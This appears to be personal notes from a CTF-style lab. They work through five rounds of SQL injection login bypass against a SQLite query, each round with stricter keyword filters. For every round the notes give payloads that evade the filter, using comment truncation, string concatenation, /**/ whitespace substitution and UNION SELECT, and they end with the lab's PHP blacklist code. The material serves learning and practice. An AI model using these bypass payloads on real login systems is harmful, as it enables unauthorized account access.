Find all instances of a text line files in current and all subdirectories

grep -r "test"


## SQL injection (sqlite)

`SELECT * FROM user WHERE username='<u>' AND password='<p>'`

Task is to login as admin (known username as `admin`) with the following restriction:

1. `or`
u: admin' --
p: (doesn't matter because commented out with --)

2. `or` `and` `like` `=` `--`

u: admin'; #
p: (doesn't materr because commented out with #)

3. `or` `and` `=` `like` `>` `<` `--` (I suspect also `#`)

u: admin';
p: (doesn't matter because statment has been ended)

4 `or` `and` `=` `like` `>` `<` `--` `admin` + common filters (whitespace!)

my idea: concat!

u: ad'||'min';
p: (doesn't matter because statement has ended)

alternative:

u: ad/\*\*/min';  (`ad/**/min';`)

u: blah'/\*\*/union/\*\*/select/\*\*/*/\*\*/from/\*\*/users/\*\*/limit/\*\*/1;
(`blah'/*\*/union/**/select/**/*/**/from/**/users/**/limit/**/1;`)

5. `or` `and` `=` `like` `>` `<` `--` `admin` `union` + common filters (whitespace!)

All Filters:

```php
<?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}
?>
```
